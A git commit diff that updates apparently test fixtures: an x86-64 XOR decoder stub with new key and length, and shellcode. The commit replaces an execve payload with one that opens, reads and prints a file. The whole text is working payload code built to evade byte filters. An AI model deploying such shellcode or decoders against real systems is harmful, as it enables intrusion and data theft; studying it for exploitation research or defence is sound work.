9eddca1627e084aabe0c6bec4bc2d197b40255b8
= <mail@mhackaron.yt>
2019-11-21 20:32:38 +0100

    Update

--- tests/decoder.asm
+++ tests/decoder.asm
@@ -3,12 +3,12 @@ jmp short L1
 L2:
 	pop rsi
 	xor rcx, rcx
-	mov cl, 0x38
+	mov cl, 0x45
 L3:
-	xor byte [rsi + rcx], 0x71
+	xor byte [rsi + rcx], 0x74
 	sub cl, 1
 	jnz short L3
-	xor byte [rsi + rcx], 0x71
+	xor byte [rsi + rcx], 0x74
 	jmp short L4
 L1:
 	call L2
--- tests/shellcode.asm
+++ tests/shellcode.asm
@@ -1,18 +1,26 @@
 BITS 64
-jmp short jukebox
-shellcode:
-	pop    rdi
-	mov    rbp, rsp
-	push 0
-	add rdi, 10
-	push rdi
-	sub rdi, 10
-	push rdi
-	xor    rax, rax
-	xor    rdx, rdx
-	mov    al, 0x3b
-	mov    rdi, qword [rsp]
-	mov    rsi, rsp
+jmp short L1
+L2:
+	pop rdi
+	xor rax, rax
+	add al, 2
+	xor rsi, rsi
 	syscall
-jukebox:
-	call shellcode
+	
+	sub sp, 0xfff
+	lea rsi, [rsp]
+	mov rdi, rax
+	xor rdx, rdx
+	mov dx, 0xfff
+	xor rax, rax
+	syscall
+
+	xor rdi, rdi
+	add dil, 1
+	mov rdx, rax
+	xor rax, rax
+	add al, 1
+	syscall
+
+L1:
+	call L2
